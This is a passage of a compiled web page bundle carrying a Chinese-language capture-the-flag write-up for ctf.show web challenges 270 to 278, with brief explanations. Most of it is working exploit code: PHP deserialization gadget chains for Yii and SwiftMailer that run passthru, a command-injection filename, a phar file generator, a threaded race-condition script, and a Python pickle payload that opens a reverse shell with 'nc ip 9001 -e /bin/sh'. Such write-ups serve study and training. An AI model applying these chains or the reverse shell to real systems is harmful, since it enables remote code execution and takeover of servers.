}\r\n}\r\n\r\nnamespace phpDocumentor\\Reflection\\DocBlock\\Tags{\r\n\r\n    use Faker\\Generator;\r\n\r\n    class See{\r\n        protected $description;\r\n        public function __construct()\r\n        {\r\n            $this->description = new Generator();\r\n        }\r\n    }\r\n}\r\nnamespace{\r\n    use phpDocumentor\\Reflection\\DocBlock\\Tags\\See;\r\n    class Swift_KeyCache_DiskKeyCache{\r\n        private $keys = [];\r\n        private $path;\r\n        public function __construct()\r\n        {\r\n            $this->path = new See;\r\n            $this->keys = array(\r\n                \"axin\"=>array(\"is\"=>\"handsome\")\r\n            );\r\n        }\r\n    }\r\n    // \u751f\u6210poc\r\n    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));\r\n}\n"})}),"\n",(0,i.jsx)(e.h2,{id:"web270yii\u6846\u67b6",children:"web270(yii\u6846\u67b6)"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\nnamespace yii\\rest {\r\n    class Action\r\n    {\r\n        public $checkAccess;\r\n    }\r\n    class IndexAction\r\n    {\r\n        public function __construct($func, $param)\r\n        {\r\n            $this->checkAccess = $func;\r\n            $this->id = $param;\r\n        }\r\n    }\r\n}\r\nnamespace yii\\web {\r\n    abstract class MultiFieldSession\r\n    {\r\n        public $writeCallback;\r\n    }\r\n    class DbSession extends MultiFieldSession\r\n    {\r\n        public function __construct($func, $param)\r\n        {\r\n            $this->writeCallback = [new \\yii\\rest\\IndexAction($func, $param), \"run\"];\r\n        }\r\n    }\r\n}\r\nnamespace yii\\db {\r\n    use yii\\base\\BaseObject;\r\n    class BatchQueryResult\r\n    {\r\n        private $_dataReader;\r\n        public function __construct($func, $param)\r\n        {\r\n            $this->_dataReader = new \\yii\\web\\DbSession($func, $param);\r\n        }\r\n    }\r\n}\r\nnamespace {\r\n    $exp = new \\yii\\db\\BatchQueryResult('passthru', 'tac /flagsaa');\r\n    echo(base64_encode(serialize($exp)));\r\n}\n"})}),"\n",(0,i.jsx)(e.h2,{id:"web275",children:"web275"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\nhighlight_file(__FILE__);\r\nclass filter{\r\n    public $filename;\r\n    public $filecontent;\r\n    public $evilfile=false;\r\n\r\n    public function __construct($f,$fn){\r\n        $this->filename=$f;\r\n        $this->filecontent=$fn;\r\n    }\r\n    public function checkevil(){\r\n        if(preg_match('/php|\\.\\./i', $this->filename)){\r\n            $this->evilfile=true;\r\n        }\r\n        if(preg_match('/flag/i', $this->filecontent)){\r\n            $this->evilfile=true;\r\n        }\r\n        return $this->evilfile;\r\n    }\r\n    public function __destruct(){\r\n        if($this->evilfile){\r\n            system('rm '.$this->filename);\r\n        }\r\n    }\r\n}\r\n\r\nif(isset($_GET['fn'])){\r\n    $content = file_get_contents('php://input');\r\n    $f = new filter($_GET['fn'],$content);\r\n    if($f->checkevil()===false){\r\n        file_put_contents($_GET['fn'], $content);\r\n        copy($_GET['fn'],md5(mt_rand()).'.txt');\r\n        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);\r\n        echo 'work done';\r\n    }\r\n    \r\n}else{\r\n    echo 'where is flag?';\r\n}\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u76f4\u63a5rce\u6216\u8005\u7ade\u4e89"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"fn=php;tac f*\n"})}),"\n",(0,i.jsx)(e.h2,{id:"web276phar\u53cd\u5e8f\u5217\u5316",children:"web276(phar\u53cd\u5e8f\u5217\u5316)"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\nhighlight_file(__FILE__);\r\n\r\nclass filter{\r\n    public $filename;\r\n    public $filecontent;\r\n    public $evilfile=false;\r\n    public $admin = false;\r\n\r\n    public function __construct($f,$fn){\r\n        $this->filename=$f;\r\n        $this->filecontent=$fn;\r\n    }\r\n    public function checkevil(){\r\n        if(preg_match('/php|\\.\\./i', $this->filename)){\r\n            $this->evilfile=true;\r\n        }\r\n        if(preg_match('/flag/i', $this->filecontent)){\r\n            $this->evilfile=true;\r\n        }\r\n        return $this->evilfile;\r\n    }\r\n    public function __destruct(){\r\n        if($this->evilfile && $this->admin){\r\n            system('rm '.$this->filename);\r\n        }\r\n    }\r\n}\r\n\r\nif(isset($_GET['fn'])){\r\n    $content = file_get_contents('php://input');\r\n    $f = new filter($_GET['fn'],$content);\r\n    if($f->checkevil()===false){\r\n        file_put_contents($_GET['fn'], $content);\r\n        copy($_GET['fn'],md5(mt_rand()).'.txt');\r\n        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);\r\n        echo 'work done';\r\n    }\r\n    \r\n}else{\r\n    echo 'where is flag?';\r\n}\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u9898\u589e\u52a0\u4e86admin\u53c2\u6570\uff0c\u5e76\u4e14\u4e0d\u80fd\u63a7\uff0c\u6211\u4eec\u9700\u8981\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u4e86"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u9898\u76ee\u4e2d\u6709\u5199\u6587\u4ef6\u7684\u51fd\u6570\uff0c\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7file_put_contents\u5199phar\u6587\u4ef6\uff0c\u7136\u540e\u518d\u901a\u8fc7file_put_contents\u89e6\u53d1phar\u53cd\u5e8f\u5217\u5316\u3002\u5f53\u7136\u6211\u4eec\u5f97\u5728\u5220\u9664\u6587\u4ef6\u524d\u6267\u884c\u5b8c\u8fd9\u4e24\u4e2a\u64cd\u4f5c\uff0c\u6240\u4ee5\u9700\u8981\u7528\u5230\u6761\u4ef6\u7ade\u4e89\u3002"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"payload\uff1a"}),"\n",(0,i.jsx)(e.p,{children:"\u751f\u6210phar\u6587\u4ef6"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:'<?php\r\n\r\nclass filter{\r\n    public $filename = "1|tac f*";\r\n    public $filecontent;\r\n    public $evilfile = true;\r\n    public $admin = true;\r\n}\r\n\r\n$phar = new Phar("phar.phar");\r\n$phar->startBuffering();\r\n$phar->setStub("<?php __HALT_COMPILER(); ?>");\r\n\r\n$o = new filter();\r\n$phar->setMetadata($o);\r\n$phar->addFromString("test.txt", "test");\r\n$phar->stopBuffering();\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u6761\u4ef6\u7ade\u4e89"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-python",children:"import requests\r\nimport time\r\nimport threading\r\n\r\nurl = 'http://02477138-eafb-4540-9e0d-858099b59b8c.challenge.ctf.show/'\r\n\r\nf = open(r'D:\\php _project\\php_ser\\phar.phar','rb')\r\ndata = f.read()\r\nflag = False\r\n\r\n\r\ndef writePhar():\r\n    response = requests.post(url+'?fn=phar.phar',data=data)\r\n\r\n\r\ndef readPhar():\r\n    global flag\r\n    response = requests.post(url+'?fn=phar://phar.phar',data='')\r\n    if 'ctfshow' in response.text and flag is False:\r\n        print(response.text)\r\n        flag = True\r\n\r\n\r\nwhile flag is False:\r\n    a = threading.Thread(target=writePhar)\r\n    b = threading.Thread(target=readPhar)\r\n    a.start()\r\n    b.start()\n"})}),"\n",(0,i.jsx)(e.h2,{id:"web278python\u53cd\u5e8f\u5217\u5316",children:"web278(python\u53cd\u5e8f\u5217\u5316)"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m)\n"})}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"pickle\u6a21\u5757\u7684\u5e94\u7528\u5f88\u7b80\u5355\uff0c\u53ea\u6709\u56db\u4e2a\u65b9\u6cd5\uff1a"}),"\n",(0,i.jsx)(e.p,{children:"dumps()\uff1a\u5c06 Python \u4e2d\u7684\u5bf9\u8c61\u5e8f\u5217\u5316\u6210\u4e8c\u8fdb\u5236\u5bf9\u8c61\uff0c\u5e76\u8fd4\u56de\r\nloads()\uff1a\u8bfb\u53d6\u7ed9\u5b9a\u7684\u4e8c\u8fdb\u5236\u5bf9\u8c61\u6570\u636e\uff0c\u5e76\u5c06\u5176\u8f6c\u6362\u4e3a Python \u5bf9\u8c61\r\ndump()\uff1a\u5c06 Python \u4e2d\u7684\u5bf9\u8c61\u5e8f\u5217\u5316\u6210\u4e8c\u8fdb\u5236\u5bf9\u8c61\uff0c\u5e76\u5199\u5165\u6587\u4ef6\r\nload()\uff1a\u8bfb\u53d6\u6307\u5b9a\u7684\u5e8f\u5217\u5316\u6570\u636e\u6587\u4ef6\uff0c\u5e76\u8fd4\u56de\u5bf9\u8c61"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-python",children:"import pickle\r\nimport base64\r\n\r\n\r\nclass A():\r\n\tdef __reduce__(self):\r\n\t\treturn(eval,(\"__import__('os').popen('nc ip 9001 -e /bin/sh').read()\",))\r\n\r\na = A()\r\ntest = pickle.dumps(a)\r\nprint(base64.b64encode(test))\n"})})]})}function o(n={}){const{wrapper:e}={...(0,c.R)(),...n.components};return e?(0,i.jsx)(e,{...n,children:(0,i.jsx)(h,{...n})}):h(n)}}}]);